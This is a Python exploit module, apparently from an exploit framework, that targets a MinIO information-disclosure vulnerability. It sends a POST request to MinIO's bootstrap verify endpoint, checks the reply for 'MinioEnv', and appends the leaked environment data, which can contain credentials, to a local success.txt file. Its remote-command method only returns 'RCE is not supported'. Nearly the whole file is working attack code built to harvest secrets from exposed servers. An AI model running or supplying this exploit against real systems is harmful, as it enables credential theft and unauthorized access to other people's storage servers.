from core.exploit import *


class Minio(Exploit):
    """
    Minio does not support RCE and only provides information leakage, 
    Because the vulnerability is not a non-destructive exploit and 
    there is a risk of damaging the system
    """

    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)

    def check(self):
        uri = "/minio/bootstrap/v1/verify"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }
        response = self.client.request("POST", uri, headers=headers, data="")
        if response.status_code == 200 and "MinioEnv" in response.text:
            self.log("Vulnerabilities found", "info")
            with open("success.txt", "a+") as f:
                f.write(response.text+"\n")
            return True
        self.log("No vulnerabilities found", "error")
        return False


    def upload(self):
        if self.check():
            return ExploitStatus.SUCCESS
        return ExploitStatus.FAILED

    def attack(self, cmd):
        return b'RCE is not supported'

    def clean(self):
        pass

